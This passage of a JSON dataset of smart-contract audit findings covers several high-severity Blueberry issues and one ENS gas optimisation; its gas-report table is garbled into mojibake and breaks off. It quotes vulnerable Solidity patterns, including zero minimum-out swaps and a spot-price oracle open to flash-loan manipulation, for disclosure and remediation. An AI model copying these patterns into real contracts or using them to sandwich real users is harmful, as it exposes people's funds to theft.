      "github_link": "https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/126",
      "tags": [
        "Slippage",
        "Configuration",
        "Coding-Bug"
      ],
      "finders": [
        "Ch\\_301",
        "0x52"
      ]
    },
    {
      "id": "18485",
      "title": "H-5: ConvexSpell#closePositionFarm removes liquidity without any slippage protection",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/124 \n\n## Found by \n0x52, Breeje, Ch\\_301, n1punp\n## Summary\n\nConvexSpell#closePositionFarm removes liquidity without any slippage protection allowing withdraws to be sandwiched and stolen. Curve liquidity has historically been strong but for smaller pairs their liquidity is getting low enough that it can be manipulated via flashloans. \n\n## Vulnerability Detail\n\n[ConvexSpell.sol#L204-L208](https://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/spell/ConvexSpell.sol#L204-L208)\n\n            ICurvePool(pool).remove_liquidity_one_coin(\n                amountPosRemove,\n                int128(tokenIndex),\n                0\n            );\n\nLiquidity is removed as a single token which makes it vulnerable to sandwich attacks but no slippage protection is implemented. The same issue applies to CurveSpell.\n\n## Impact\n\nUser withdrawals can be sandwiched\n\n## Code Snippet\n\n[ConvexSpell.sol#L147-L230](https://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/spell/ConvexSpell.sol#L147-L230)\n\n[CurveSpell.sol#L143-L223](https://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/spell/CurveSpell.sol#L143-L223)\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nAllow user to specify min out",
      "summary": "\nThis bug report is about the ConvexSpell and CurveSpell smart contracts, which are used to remove liquidity from Curve pools. The issue is that these smart contracts remove liquidity without any slippage protection, which makes them vulnerable to sandwich attacks. This means that user withdrawals can be sandwiched and stolen. The code snippets which are vulnerable to this attack are ConvexSpell.sol#L147-L230 and CurveSpell.sol#L143-L223. The bug was found by 0x52, Breeje, Ch_301, and n1punp. The recommended solution is to allow users to specify a minimum out.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry Update",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/124",
      "tags": [
        "Slippage",
        "Sandwich Attack",
        "Flash Loan"
      ],
      "finders": [
        "Ch\\_301",
        "0x52",
        "Breeje",
        "n1punp"
      ]
    },
    {
      "id": "18484",
      "title": "H-4: Potential flash loan attack vulnerability in `getPrice` function of CurveOracle",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/123 \n\n## Found by \nBauer, helpMePlease\n## Summary\nDuring a security review of the `getPrice` function in the CurveOracle, a potential flash loan attack vulnerability was identified.\n\n## Vulnerability Detail\nThe `getPrice` function retrieves the spot price of each token in a Curve LP pool, calculates the minimum price among them, and multiplies it by the virtual price of the LP token to determine the USD value of the LP token. If the price of one or more tokens in the pool is manipulated, this can cause the minimum price calculation to be skewed, leading to an incorrect USD value for the LP token. This can be exploited by attackers to make a profit at the expense of other users.\n\n## Impact\nThis vulnerability could potentially allow attackers to manipulate the price of tokens in Curve LP pools and profit at the expense of other users. If exploited, this vulnerability could result in significant financial losses for affected users.\n\n## Code Snippet\nhttps://github.com/sherlock-audit/2023-04-blueberry/blob/96eb1829571dc46e1a387985bd56989702c5e1dc/blueberry-core/contracts/oracle/CurveOracle.sol#L122\n\n## Tool used\n\nManual Review\n\n## Recommendation\nuse TWAP to determine the prices of the underlying assets in the pool.",
      "summary": "\nA security review of the `getPrice` function in the CurveOracle revealed a potential flash loan attack vulnerability. The `getPrice` function retrieves the spot price of each token in a Curve LP pool, calculates the minimum price among them, and multiplies it by the virtual price of the LP token to determine the USD value of the LP token. If the price of one or more tokens in the pool is manipulated, this can cause the minimum price calculation to be skewed, leading to an incorrect USD value for the LP token. This can be exploited by attackers to make a profit at the expense of other users. If exploited, this vulnerability could result in significant financial losses for affected users. The code snippet for this vulnerability can be found at  https://github.com/sherlock-audit/2023-04-blueberry/blob/96eb1829571dc46e1a387985bd56989702c5e1dc/blueberry-core/contracts/oracle/CurveOracle.sol#L122. The security review was conducted manually. The recommendation to mitigate this vulnerability is to use TWAP (Time-Weighted Average Price) to determine the prices of the underlying assets in the pool.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry Update",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/123",
      "tags": [
        "Oracle",
        "Lending Pool",
        "Flash Loan"
      ],
      "finders": [
        "Bauer",
        "helpMePlease"
      ]
    },
    {
      "id": "18483",
      "title": "H-3: Users are forced to swap all reward tokens with no slippage protection",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/121 \n\n## Found by \n0x52, Bauer, Breeje, J4de, ctf\\_sec, n1punp, nobody2018\n## Summary\n\nAuraSpell forces users to swap their reward tokens to debt token but doesn't allow them to specify any slippage values.\n\n## Vulnerability Detail\n\n[AuraSpell.sol#L193-L203\n](https://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/spell/AuraSpell.sol#L193-L203)\n\n        for (uint256 i = 0; i < rewardTokens.length; i++) {\n            uint256 rewards = _doCutRewardsFee(rewardTokens[i]);\n            _ensureApprove(rewardTokens[i], address(swapRouter), rewards);\n            swapRouter.swapExactTokensForTokens(\n                rewards,\n                0,\n                swapPath[i],\n                address(this),\n                type(uint256).max\n            );\n        }\n\nAbove all reward tokens are swapped and always use 0 for min out meaning that deposits will be sandwiched and stolen.\n\n## Impact\n\nAll reward tokens can be sandwiched and stolen\n\n## Code Snippet\n\n[AuraSpell.sol#L149-L224](https://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/spell/AuraSpell.sol#L149-L224)\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nAllow user to specify slippage parameters for all reward tokens",
      "summary": "\nThis bug report is about an issue found in the AuraSpell.sol contract, which is part of the Sherlock Audit project. The issue is that users are forced to swap all reward tokens with no slippage protection. This was found through manual review by 0x52, Bauer, Breeje, J4de, ctf_sec, n1punp, and nobody2018.\n\nThe vulnerability detail is that the code snippet for the swap function does not allow users to specify any slippage values, meaning that deposits can be sandwiched and stolen. This can result in all reward tokens being sandwiched and stolen. The code snippet for the vulnerability can be found in AuraSpell.sol#L193-L203 and the full code snippet can be found in AuraSpell.sol#L149-L224.\n\nThe impact of this vulnerability is that all reward tokens can be sandwiched and stolen. The recommendation for this issue is to allow users to specify slippage parameters for all reward tokens.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry Update",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/121",
      "tags": [
        "Slippage",
        "Deposit/Reward tokens"
      ],
      "finders": [
        "Bauer",
        "0x52",
        "J4de",
        "n1punp",
        "nobody2018",
        "Breeje",
        "ctf\\_sec"
      ]
    },
    {
      "id": "18482",
      "title": "H-2: AuraSpell#openPositionFarm uses incorrect join type for balancer",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/120 \n\n## Found by \n0x52, cuthalion0x\n## Summary\n\nThe JoinPoolRequest uses \"\" for userData meaning that it will decode into 0. This is problematic because join requests of type 0 are \"init\" type joins and will revert for pools that are already initialized. \n\n## Vulnerability Detail\n\nhttps://etherscan.io/address/0x5c6ee304399dbdb9c8ef030ab642b10820db8f56#code#F24#L49\n\n    enum JoinKind { INIT, EXACT_TOKENS_IN_FOR_BPT_OUT, TOKEN_IN_FOR_EXACT_BPT_OUT }\n\nWe see above that enum JoinKind is INIT for 0 values.\n\nhttps://etherscan.io/address/0x5c6ee304399dbdb9c8ef030ab642b10820db8f56#code#F24#L290\n\n            return _joinExactTokensInForBPTOut(balances, normalizedWeights, userData);\n        } else if (kind == JoinKind.TOKEN_IN_FOR_EXACT_BPT_OUT) {\n            return _joinTokenInForExactBPTOut(balances, normalizedWeights, userData);\n        } else {\n            _revert(Errors.UNHANDLED_JOIN_KIND);\n        }\n\nHere user data is decoded into join type and since it is \"\" it will decode to type 0 which will result in a revert.\n\n## Impact\n\nUsers will be unable to open any farm position on AuraSpell\n\n## Code Snippet\n\n[AuraSpell.sol#L63-L147](https://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/spell/AuraSpell.sol#L63-L147)\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nUses JoinKind = 1 for user data",
      "summary": "\nThis bug report is about an issue found in the AuraSpell#openPositionFarm function in the Sherlock Audit 2023-04-blueberry-judging repository. The issue is that the JoinPoolRequest uses \"\" for userData, which will decode into 0, resulting in a join request of type 0, which is an \"init\" type join and will revert for pools that are already initialized. This issue was found by 0x52 and cuthalion0x and confirmed by manual review. The impact of this issue is that users will be unable to open any farm position on AuraSpell. The code snippet for this issue can be found in the AuraSpell.sol#L63-L147. The recommendation is to use JoinKind = 1 for user data.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry Update",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/120",
      "tags": [
        "Configuration",
        "Coding-Bug"
      ],
      "finders": [
        "0x52",
        "cuthalion0x"
      ]
    },
    {
      "id": "18481",
      "title": "H-1: attackers will keep stealing the `rewards` from Convex SPELL",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/101 \n\n## Found by \nBauer, Ch\\_301\n## Summary\nOn [WConvexPools.burn()](https://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/wrapper/WConvexPools.sol#L201-L235) transfer [CRV + CVX + the extra rewards](https://docs.convexfinance.com/convexfinance/general-information/why-convex/convex-for-liquidity-providers) to Convex SPELL \n\n\n## Vulnerability Detail\nBut [ConvexSpell.openPositionFarm()](https://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/spell/ConvexSpell.sol#L67-L138) only refund CVX to the user.\nSo the rest rewards will stay in the SPELL intel if someone (could be an attacker) invokes `_doRefund()` within `closePositionFarm()` with the same address tokens \n\n## Impact\n- Convex SPELL steals the user rewards \n- the protocol will lose some fees \n- attackers will keep stealing the rewards from Convex SPELL\n\n## Code Snippet\n`WConvexPools.burn()` transfer CRV + CVX + the extra rewards\nhttps://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/wrapper/WConvexPools.sol#L201-L235\n```solidity\n        // Transfer LP Tokens\n        IERC20Upgradeable(lpToken).safeTransfer(msg.sender, amount);\n\n        // Transfer Reward Tokens\n        (rewardTokens, rewards) = pendingRewards(id, amount);\n\n        for (uint i = 0; i < rewardTokens.length; i++) {\n            IERC20Upgradeable(rewardTokens[i]).safeTransfer(\n                msg.sender,\n                rewards[i]\n            );\n        }\n```\n\nonly refund CVX to the user\nhttps://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/spell/ConvexSpell.sol#LL127C1-L138C10\n```solidity\n        // 6. Take out existing collateral and burn\n        IBank.Position memory pos = bank.getCurrentPositionInfo();\n        if (pos.collateralSize > 0) {\n            (uint256 pid, ) = wConvexPools.decodeId(pos.collId);\n            if (param.farmingPoolId != pid)\n                revert Errors.INCORRECT_PID(param.farmingPoolId);\n            if (pos.collToken != address(wConvexPools))\n                revert Errors.INCORRECT_COLTOKEN(pos.collToken);\n            bank.takeCollateral(pos.collateralSize);\n            wConvexPools.burn(pos.collId, pos.collateralSize);\n            _doRefundRewards(CVX);\n        }\n```\n\n## Tool used\n\nManual Review\n\n## Recommendation\nyou should Refund all Rewards (CRV + CVX + the extra rewards)\n\n\n\n## Discussion\n\n**Ch-301**\n\nEscalate for 10 USDC\n\nConvex docs are confirming this point \n\n```diff\nConvex allows liquidity providers to earn trading fees and claim boosted CRV without locking CRV themselves. Liquidity providers can receive boosted CRV and liquidity mining rewards with minimal effort:\nEarn claimable CRV with a high boost without locking any CRV\nEarn CVX rewards\nZero deposit and withdraw fees\nZero fees on extra incentive tokens (SNX, etc)\n```\nand [WConvexPools.burn()](https://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/wrapper/WConvexPools.sol#L201-L235) handle this properly\n\nso Convex SPELL should refund all the rewards\n\n**sherlock-admin**\n\n > Escalate for 10 USDC\n> \n> Convex docs are confirming this point \n> \n> ```diff\n> Convex allows liquidity providers to earn trading fees and claim boosted CRV without locking CRV themselves. Liquidity providers can receive boosted CRV and liquidity mining rewards with minimal effort:\n> Earn claimable CRV with a high boost without locking any CRV\n> Earn CVX rewards\n> Zero deposit and withdraw fees\n> Zero fees on extra incentive tokens (SNX, etc)\n> ```\n> and [WConvexPools.burn()](https://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/wrapper/WConvexPools.sol#L201-L235) handle this properly\n> \n> so Convex SPELL should refund all the rewards\n\nYou've created a valid escalation for 10 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**ctf-sec**\n\nSenior watson's comment:\n\nsame as\nhttps://github.com/sherlock-audit/2023-05-blueberry-judging/issues/29 \n\n**hrishibhat**\n\nEscalation accepted\n\nValid high \nThis issue is a valid high along with another duplicate #42\n\n**sherlock-admin**\n\n> Escalation accepted\n> \n> Valid high \n> This issue is a valid high along with another duplicate #42\n\n    This issue's escalations have been accepted!\n\n    Contestants' payouts and scores will be updated according to the changes made on this issue.",
      "summary": "\nThis bug report is about an issue found in the Convex SPELL code. The code allows users to transfer CRV, CVX, and extra rewards to the SPELL, but only refunds CVX to the user when the position is closed. This means that the extra rewards remain in the SPELL, and can be stolen by attackers if they invoke the same address tokens with the _doRefund() function. This vulnerability can cause the Convex SPELL to steal user rewards, leading to the protocol losing fees, and attackers being able to keep stealing rewards from the SPELL. The code snippet provided in the report shows the WConvexPools.burn() function, which transfers CRV, CVX, and extra rewards, and the ConvexSpell.openPositionFarm() function, which only refunds CVX to the user. The tool used to identify this bug was manual review. The recommendation is to refund all rewards (CRV + CVX + the extra rewards). The discussion that followed included a comment from Ch-301, who suggested escalating the bug for 10 USDC, and Convex docs to confirm the point. Senior Watson's comment pointed to a duplicate issue, and Hrishibhat accepted the escalation. Finally, Sherlock-Admin confirmed that the issue's escalation had been accepted, and that contestants' payouts and scores would be updated accordingly.",
      "quality_score": 1,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry Update",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/101",
      "tags": [
        "Business Logic",
        "Deposit/Reward tokens",
        "Coding-Bug"
      ],
      "finders": [
        "Bauer",
        "Ch\\_301"
      ]
    },
    {
      "id": "21920",
      "title": "[G-16] Refactor modifier to avoid two external calls when calling `setPublicSuffixList`",
      "impact": "GAS",
      "content": "The `onlyOwner` modifier performs two external calls. In order to avoid these two calls everytime `setPublicSufficList` is called, we can perform these two calls in the constructor and create immutable variables for the return values.\n\nhttps://github.com/code-423n4/2023-04-ens/blob/main/contracts/dnsregistrar/DNSRegistrar.sol#L73-L78\n\n```solidity\nFile: contracts/dnsregistrar/DNSRegistrar.sol\n73:    modifier onlyOwner() {\n74:        Root root = Root(ens.owner(bytes32(0)));\n75:        address owner = root.owner();\n76:        require(msg.sender == owner);\n77:        _;\n78:    }\n```\n```diff\ndiff --git a/contracts/dnsregistrar/DNSRegistrar.sol b/contracts/dnsregistrar/DNSRegistrar.sol\nindex 953a9a3..3779292 100644\n--- a/contracts/dnsregistrar/DNSRegistrar.sol\n+++ b/contracts/dnsregistrar/DNSRegistrar.sol\n@@ -28,6 +28,7 @@ contract DNSRegistrar is IDNSRegistrar, IERC165 {\n     PublicSuffixList public suffixes;\n     address public immutable previousRegistrar;\n     address public immutable resolver;\n+    address private immutable rootOwner;\n     // A mapping of the most recent signatures seen for each claimed domain.\n     mapping(bytes32 => uint32) public inceptions;\n\n@@ -65,15 +66,14 @@ contract DNSRegistrar is IDNSRegistrar, IERC165 {\n         suffixes = _suffixes;\n         emit NewPublicSuffixList(address(suffixes));\n         ens = _ens;\n+        rootOwner = Root(_ens.owner(bytes32(0))).owner();\n     }\n\n     /**\n      * @dev This contract's owner-only functions can be invoked by the owner of the ENS root.\n      */\n     modifier onlyOwner() {\n-        Root root = Root(ens.owner(bytes32(0)));\n-        address owner = root.owner();\n-        require(msg.sender == owner);\n+        require(msg.sender == rootOwner);\n         _;\n     }\n```\n\n## `GasReport` output, with all optimizations applied\n```js\nÂ·--------------------------------------------------------|---------------------------|--------------|-----------------------------Â·\n|                  Solc version: 0.8.17                  Â·  Optimizer enabled: true  Â·  Runs: 1300  Â·  Block limit: 30000000 gas  â”‚\nÂ·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·\n|  Methods                                                                                                                        â”‚\nÂ·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·\n|  Contract                Â·  Method                     Â·  Min        Â·  Max        Â·  Avg         Â·  # calls      Â·  eur (avg)  â”‚\nÂ·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·\n|  DNSRegistrar            Â·  proveAndClaim              Â·     170611  Â·     277955  Â·      240737  Â·            7  Â·          -  â”‚\nÂ·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·\n|  DNSRegistrar            Â·  proveAndClaimWithResolver  Â·     272572  Â·     310200  Â·      291386  Â·            2  Â·          -  â”‚\nÂ·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·\n|  DNSSECImpl              Â·  setAlgorithm               Â·      47660  Â·      47672  Â·       47671  Â·           96  Â·          -  â”‚\nÂ·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·\n|  DNSSECImpl              Â·  setDigest                  Â·      47703  Â·      47727  Â·       47726  Â·           48  Â·          -  â”‚\nÂ·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·\n|  ENSRegistry             Â·  setOwner                   Â·      28697  Â·      28721  Â·       28719  Â·           21  Â·          -  â”‚\nÂ·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·\n|  ENSRegistry             Â·  setResolver                Â·      48254  Â·      48266  Â·       48265  Â·          112  Â·          -  â”‚\nÂ·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·\n|  ENSRegistry             Â·  setSubnodeOwner            Â·      48998  Â·      49394  Â·       49319  Â·          286  Â·          -  â”‚\nÂ·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·\n|  ERC20Recoverable        Â·  recoverFunds               Â·          -  Â·          -  Â·       35298  Â·            1  Â·          -  â”‚\nÂ·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·\n|  MockERC20               Â·  transfer                   Â·          -  Â·          -  Â·       51378  Â·            2  Â·          -  â”‚\nÂ·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·\n|  OwnedResolver           Â·  setAddr                    Â·      53760  Â·      53772  Â·       53770  Â·            7  Â·          -  â”‚\nÂ·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·\n|  PublicResolver          Â·  setAddr                    Â·          -  Â·          -  Â·       58510  Â·           22  Â·          -  â”‚\nÂ·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·\n|  PublicResolver          Â·  setApprovalForAll          Â·          -  Â·          -  Â·       46189  Â·            1  Â·          -  